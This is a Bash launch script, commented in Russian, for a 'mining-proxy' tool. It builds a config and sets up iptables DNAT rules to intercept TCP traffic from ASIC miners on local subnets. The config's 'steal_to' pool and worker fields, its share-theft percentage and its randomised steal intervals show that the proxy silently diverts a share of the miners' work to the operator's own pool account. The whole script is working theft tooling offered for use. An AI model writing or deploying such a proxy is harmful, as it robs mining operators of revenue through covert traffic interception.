#!/usr/bin/env bash
# Интерактивный запуск mining-proxy в фоне (без systemd).
#
# Логика:
#   - если env-переменная MP_* задана  -> используем её, показываем в списке
#   - если не задана                   -> задаём вопрос с дефолтом из config.example.yaml
#
# Переменные (префикс MP_):
#   MP_LISTEN_ADDR, MP_UPSTREAM_POOL, MP_TRANSPARENT, MP_UPSTREAM_SSL,
#   MP_STEAL_POOL, MP_STEAL_WORKER, MP_STEAL_PASS, MP_STEAL_SSL,
#   MP_PERCENTAGE, MP_PAUSE_SHARES, MP_INTERVAL_MIN_HOURS,
#   MP_INTERVAL_MAX_HOURS, MP_SETUP_IPTABLES, MP_ALLOWED_SUBNETS
#   (через запятую), MP_CAPTURE_ALL_TCP, MP_MONITOR_ADDR
#
# Часть вопросов условная: поле, не влияющее на выбранный режим, не
# спрашивается (см. последнее поле записи в FIELDS ниже).
#
# Использование:
#   MP_UPSTREAM_POOL=x MP_STEAL_POOL=... mining-proxy-start
set -euo pipefail

SCRIPT="$(readlink -f "${BASH_SOURCE[0]}")"
DIR="$(cd "$(dirname "$SCRIPT")/.." && pwd)"
BIN="$DIR/mining-proxy"
LOG="$DIR/proxy.log"
PIDFILE="$DIR/proxy.pid"
CONF="$DIR/config.example.yaml"   # эталон: источник дефолтов для анкеты
OUT="$DIR/config.local.yaml"

# --- Вспомогательные функции ---
# Определены до первого использования: блок MP_SKIP_PROMPT выше тоже читает конфиг.
# --- Дефолты: сначала из config.example.yaml (grep), иначе захардкоженные ---
cfg_val() { # cfg_val <yaml_key> <harcode_default>
    local v
    v="$(grep -E "^[[:space:]]*${1}:" "$CONF" 2>/dev/null | head -1 | awk -F': ' '{print $2}' | tr -d '"' | tr -d '[:space:]' | sed 's/#.*//')"
    [[ -n "$v" ]] && echo "$v" || echo "$2"
}

# detect_subnets предлагает подсети ASIC по адресам интерфейсов сервера.
#
# Зачем это нужно. Без allowed_subnets перехватывать нечего: iptables получает
# пустой список, не создаёт НИ ОДНОГО правила DNAT, а трафик ASIC продолжает
# идти мимо прокси. Раньше это проходило тихо — «setup complete» при нуле
# правил, — и оператор не понимал, почему трафик не доходит.
#
# Берём адреса всех глобальных (не loopback) интерфейсов и переводим каждый
# в /24: для типовой схемы «ASIC в одной подсети за одним eth0» этого хватает.
detect_subnets() {
    local found="" ip ifc
    while read -r ifc ip; do
        # Пропускаем виртуальные интерфейсы: docker0, br-*, veth* — это не
        # те, к которым подключены ASIC, и в подсказке они только мешают.
        case "$ifc" in
            docker*|br-*|veth*|virbr*|tun*|tap*|wg*) continue ;;
        esac
        # Уже добавили эту подсеть (у интерфейса бывает несколько адресов).
        case ",$found," in *",${ip%.*}.0/24,"*) continue ;; esac
        found+="${ip%.*}.0/24, "
    done < <(ip -4 -o addr show scope global 2>/dev/null | awk '{split($4,a,"/"); print $2, a[1]}')
    found="${found%, }"
    [[ -n "$found" ]] && echo "$found" || echo "10.0.0.0/8"
}
to_bool() { case "${1,,}" in 1|true|yes|y|on) echo true;; *) echo false;; esac; }
# cfg_val_bool читает булево поле из КОНКРЕТНОГО файла конфига (а не из
# $CONF=config.example.yaml) — нужно в пути MP_SKIP_PROMPT, где конфиг выбран.
cfg_val_bool() { # cfg_val_bool <файл> <ключ>
    local v
    v="$(grep -E "^[[:space:]]*${2}:" "$1" 2>/dev/null | head -1 | awk -F': ' '{print $2}' | tr -d '"[:space:]' | sed 's/#.*//')"
    case "${v,,}" in 1|true|yes|y|on) echo true;; *) echo false;; esac
}

if [[ -f "$PIDFILE" ]] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
    echo "mining-proxy уже запущен (pid $(cat "$PIDFILE")). Остановите: mining-proxy-stop"
    exit 1
fi

# Повторный запуск под sudo (MP_SKIP_PROMPT=1) — без вопросов, сразу старт.
if [[ "${MP_SKIP_PROMPT:-}" == "1" ]]; then
    CONF_RUN="${1:-$OUT}"

    # setup_iptables требует root. Проверяем по самому файлу конфига: если
    # NAT включён, а мы не root — перезапускаемся под sudo, иначе прокси
    # упадёт с «permission denied» на iptables.
    if [[ "$(cfg_val_bool "$CONF_RUN" setup_iptables)" == true && "$EUID" -ne 0 ]]; then
        echo "В $CONF_RUN включён setup_iptables — нужен root. Перезапускаю под sudo..."
        exec sudo -E env MP_SKIP_PROMPT=1 "$SCRIPT" "$CONF_RUN"
    fi

    [[ -x "$BIN" ]] || go build -o "$BIN" "$DIR"
    nohup "$BIN" --config "$CONF_RUN" > "$LOG" 2>&1 &
    echo $! > "$PIDFILE"
    sleep 1
    if kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
        echo "mining-proxy запущен (pid $(cat "$PIDFILE"), config $CONF_RUN). Лог: $LOG"
    else
        echo "Ошибка запуска. Смотрите: $LOG"
        exit 1
    fi
    exit 0
fi

# --- Вопрос: применить старый конфиг или настроить заново? ---
# Если config.local.yaml уже существует и не пуст — предлагаем его.
# Ответ "да" → стартуем сразу со старым конфигом, без анкеты.
# Ответ "нет" → идём в обычную интерактивную настройку.
if [[ -f "$OUT" && -s "$OUT" ]]; then
    echo
    echo "== Старый конфиг найден: $OUT =="
    printf "Применить его и запустить? [Y/n]: "
    read -r reuse || true
    case "${reuse,,}" in
        ""|y|yes|да|д|1|true) reuse_old=1 ;;
        *)                     reuse_old=0 ;;
    esac
else
    reuse_old=0
fi

if [[ "$reuse_old" == 1 ]]; then
    echo "Применяю старый конфиг: $OUT"
    # Тот же root-check, что и в интерактивном пути. Без него прокси с
    # setup_iptables: true стартовал бы не от root и падал в логе с
    # невнятным «can't open lock file /run/xtables.lock: Permission denied».
    if [[ "$(cfg_val_bool "$OUT" setup_iptables)" == true && "$EUID" -ne 0 ]]; then
        echo "В конфиге включён setup_iptables — нужен root. Перезапускаю под sudo..."
        exec sudo -E env MP_SKIP_PROMPT=1 "$SCRIPT" "$OUT"
    fi
    [[ -x "$BIN" ]] || go build -o "$BIN" "$DIR"
    nohup "$BIN" --config "$OUT" > "$LOG" 2>&1 &
    echo $! > "$PIDFILE"
    sleep 1
    if kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
        echo
        echo "mining-proxy запущен (pid $(cat "$PIDFILE")), конфиг: $OUT. Лог: $LOG"
        echo "Статус: curl http://127.0.0.1:9090/status"
    else
        echo "Ошибка запуска. Смотрите: $LOG"
        exit 1
    fi
    exit 0
fi

# --- Сбор переменных: env или интерактивный вопрос ---
# Каждая запись: "ENV_VAR|yaml_key|вопрос|дефолт|тип|условие_пропуска"
# тип: str | bool | float | int | list
# условие_пропуска: "ключ==значение" — если поле уже отвечено этим значением,
# вопрос НЕ задаётся, потому что в данном режиме поле не влияет ни на что.
# Пустое условие = спрашивать всегда.
#
# Порядок важен: ключ условия должен идти раньше зависящего от него поля.
FIELDS=(
    "MP_LISTEN_ADDR|listen_addr|адрес и порт прокси (0.0.0.0:8443)|0.0.0.0:8443|str|"
    "MP_TRANSPARENT|transparent|прозрачный режим: реальный пул по SO_ORIGINAL_DST (true/false)|$(cfg_val transparent true)|bool|"
    "MP_UPSTREAM_POOL|upstream_pool|реальный пул ASIC (host:port)|$(cfg_val upstream_pool '')|str|"
    # upstream_ssl в прозрачном режиме не действует: реальный пул берётся из
    # SO_ORIGINAL_DST, и TLS там принудительно false (proxy/dest.go).
    "MP_UPSTREAM_SSL|upstream_ssl|TLS к реальному пулу, только при transparent=false|$(cfg_val upstream_ssl false)|bool|transparent==true"
    "MP_STEAL_POOL|steal_to.pool|целевой пул для шар (host:port)|$(cfg_val steal_to.pool '')|str|"
    "MP_STEAL_WORKER|steal_to.worker|ваш воркер на целевом пуле|$(cfg_val steal_to.worker '')|str|"
    "MP_STEAL_PASS|steal_to.pass|пароль воркера|$(cfg_val steal_to.pass x)|str|"
    "MP_STEAL_SSL|steal_to.ssl|TLS к целевому пулу (true/false)|$(cfg_val steal_to.ssl false)|bool|"
    "MP_PERCENTAGE|percentage|процент шар для кражи (0.1-100)|$(cfg_val percentage 5.0)|float|"
    "MP_PAUSE_SHARES|pause_shares|пауза в ШАРАХ: точный процент (true/false)|$(cfg_val pause_shares true)|bool|"
    # При pause_shares=true ShouldSteal выходит по счётчику шар и до
    # interval_* не доходит (proxy/redirect.go) — спрашивать нечего.
    "MP_INTERVAL_MIN_HOURS|interval_min_hours|мин. интервал кражи, часов (только при pause_shares=false)|$(cfg_val interval_min_hours 2)|float|pause_shares==true"
    "MP_INTERVAL_MAX_HOURS|interval_max_hours|макс. интервал кражи, часов (только при pause_shares=false)|$(cfg_val interval_max_hours 20)|float|pause_shares==true"
    "MP_SETUP_IPTABLES|setup_iptables|автонастройка iptables/NAT (true/false)|$(cfg_val setup_iptables true)|bool|"
    # Дальше два поля нужны только если мы сами ставим правила iptables:
    # при setup_iptables=false DNAT не создаётся, и capture_all_tcp /
    # allowed_subnets на перехват не влияют (идут только в /status).
    "MP_ALLOWED_SUBNETS|allowed_subnets|подсети ASIC через запятую|$(cfg_val allowed_subnets "$(detect_subnets)")|list|setup_iptables==false"
    "MP_CAPTURE_ALL_TCP|capture_all_tcp|перенаправлять весь TCP подсети, не только порт пула (true/false)|$(cfg_val capture_all_tcp true)|bool|setup_iptables==false"
    # monitor_addr пустым не отключается — config.Load подставляет
    # 127.0.0.1:9090, поэтому вопрос остаётся (менять порт/хост нужно руками).
    "MP_MONITOR_ADDR|monitor_addr|адрес HTTP /status|$(cfg_val monitor_addr 127.0.0.1:9090)|str|"
)

declare -A RESULT   # yaml_key -> value
declare -A SKIPPED   # yaml_key -> причина пропуска (для отчёта в конце)
SECTION=""
num=1
echo "== Настройка mining-proxy =="
for entry in "${FIELDS[@]}"; do
    IFS='|' read -r envkey yamlkey label dft type skipcond <<< "$entry"

    # --- Условный пропуск: поле не влияет на выбранный режим ---
    if [[ -n "$skipcond" ]]; then
        dep_key="${skipcond%%==*}"
        dep_want="${skipcond#*==}"
        if [[ "$(to_bool "${RESULT[$dep_key]:-false}")" == "$dep_want" ]]; then
            # Значение всё равно пишем в конфиг (env > дефолт), чтобы файл
            # оставался полным и предсказуемым.
            RESULT["$yamlkey"]="${!envkey:-$dft}"
            SKIPPED["$yamlkey"]="$dep_key=$dep_want"
            if [[ -n "${!envkey:-}" ]]; then
                echo "  - $label: ${!envkey} (из env $envkey, вопрос пропущен: $dep_key=$dep_want)"
            else
                echo "  - $label: ${RESULT[$yamlkey]} (вопрос пропущен: $dep_key=$dep_want)"
            fi
            continue
        fi
    fi

    case "$yamlkey" in
        steal_to.*) SECTION="  ";;
        *) SECTION="";;
    esac

    if [[ -n "${!envkey:-}" ]]; then
        value="${!envkey}"
        echo "[$num]$SECTION $label: $value  (из env $envkey)"
    else
        printf "[%s]%s %s [%s]: " "$num" "$SECTION" "$label" "$dft"
        read -r answer || true
        value="${answer:-$dft}"
        [[ -z "$value" ]] && value="$dft"
    fi
    RESULT["$yamlkey"]="$value"
    num=$((num+1))
done

if [[ ${#SKIPPED[@]} -gt 0 ]]; then
    echo
    echo "Пропущено (не влияет на выбранный режим): ${!SKIPPED[*]}"
    echo "Если нужно изменить — задайте MP_* в окружении или правьте $OUT вручную."
fi

# --- Генерация config.local.yaml ---
# yaml_str экранирует кавычки и бэкслеши в значениях строковых полей.
yaml_str() { printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
# clean_quote срезает обёртывающие кавычки, если пользователь их ввёл.
clean_quote() { printf '%s' "$1" | sed -E 's/^["'"'"']+//; s/["'"'"']+$//'; }

{
echo "# Сгенерировано mining-proxy-start из env + ответов"
echo "listen_addr: \"$(yaml_str "${RESULT[listen_addr]}")\""
echo "upstream_pool: \"$(yaml_str "${RESULT[upstream_pool]}")\""
echo "upstream_ssl: $(to_bool "${RESULT[upstream_ssl]}")"
echo "steal_to:"
echo "  pool: \"$(yaml_str "${RESULT[steal_to.pool]}")\""
echo "  worker: \"$(yaml_str "${RESULT[steal_to.worker]}")\""
echo "  pass: \"$(yaml_str "${RESULT[steal_to.pass]}")\""
echo "  ssl: $(to_bool "${RESULT[steal_to.ssl]}")"
echo "percentage: ${RESULT[percentage]}"
echo "pause_shares: $(to_bool "${RESULT[pause_shares]}")"
echo "interval_min_hours: ${RESULT[interval_min_hours]}"
echo "interval_max_hours: ${RESULT[interval_max_hours]}"
if [[ -n "${RESULT[allowed_subnets]// /}" ]]; then
    echo "allowed_subnets:"
    IFS=',' read -ra subs <<< "${RESULT[allowed_subnets]}"
    for s in "${subs[@]}"; do
        s="$(clean_quote "$s" | tr -d ' ')"
        [[ -n "$s" ]] && echo "  - \"$(yaml_str "$s")\""
    done
else
    # Именно "[]", а не пустой ключ: строка "allowed_subnets:" без значения —
    # это YAML null, и выглядит как «подсети заданы», хотя их нет.
    echo "allowed_subnets: []"
fi
echo "setup_iptables: $(to_bool "${RESULT[setup_iptables]}")"
echo "monitor_addr: \"$(yaml_str "${RESULT[monitor_addr]}")\""
echo "transparent: $(to_bool "${RESULT[transparent]}")"
echo "capture_all_tcp: $(to_bool "${RESULT[capture_all_tcp]}")"
} > "$OUT"

echo
echo "== Итоговый конфиг: $OUT =="
cat "$OUT"

# --- Проверка: NAT включён, а перехватывать нечего? ---
# Ловим ровно тот случай, из-за которого трафик ASIC не доходил до прокси:
# setup_iptables=true, но allowed_subnets пуст. Раньше скрипт такой конфиг
# молча запускал, а прокси писал «setup complete», имея ноль правил DNAT.
if [[ "$(to_bool "${RESULT[setup_iptables]}")" == true && -z "${RESULT[allowed_subnets]// /}" ]]; then
    echo
    echo "!!! ОШИБКА: setup_iptables=true, но allowed_subnets пуст !!!"
    echo "Перехватывать нечего: iptables не создаст ни одного правила DNAT,"
    echo "и трафик ASIC будет идти мимо прокси напрямую в пул."
    echo
    echo "Что сделать: укажите подсети ASIC (например 10.4.6.0/24),"
    echo "или поставьте setup_iptables=false, если iptables настроен вручную."
    exit 1
fi

# --- Пояснение про DNS: типичная причина «ничего не работает» ---
# В tcpdump видно "10.4.6.30.34326 > 10.121.0.4.53: 3239+ A? pool.example."
# Это UDP/53 — майнер разрешает ИМЯ пула. Перенаправлять его на прокси
# нельзя и не нужно: прокси слушает только TCP, ответ на DNS-запрос
# пришёл бы на UDP и не пришёл бы вовсе, майнер не разрешил бы имя и не
# подключился. Перехватывается следующий за ним TCP-сеанс к пулу.
if [[ "$(to_bool "${RESULT[setup_iptables]}")" == true ]]; then
    cat <<'NOTE'
== Что будет перехвачено ==
  TCP-трафик подсетей allowed_subnets -> 127.0.0.1:<порт прокси>
  (при capture_all_tcp=true — весь TCP, иначе только порт upstream_pool)

  НЕ перехватывается (и не должно):
  UDP/53 DNS, NTP, DHCP и прочее — прокси работает только по TCP.
NOTE
fi

echo
echo "== Запуск =="
# --- Если нужен iptables, а root не мы — перезапускаемся под sudo ---
if [[ "$(to_bool "${RESULT[setup_iptables]}")" == true && "$EUID" -ne 0 ]]; then
    echo
    echo "setup_iptables=true требует root (права на iptables)."
    echo "Ответы уже сохранены в $OUT. Перезапускаю под sudo (пароль запросится один раз)..."
    echo
    exec sudo -E env MP_SKIP_PROMPT=1 "$SCRIPT" "$OUT"
fi

# --- Запуск ---
[[ -x "$BIN" ]] || go build -o "$BIN" "$DIR"
nohup "$BIN" --config "$OUT" > "$LOG" 2>&1 &
echo $! > "$PIDFILE"
sleep 1

if kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
    echo
    echo "mining-proxy запущен (pid $(cat "$PIDFILE")). Лог: $LOG"
    echo "Статус: curl http://127.0.0.1:9090/status"
else
    echo "Ошибка запуска. Смотрите: $LOG"
    exit 1
fi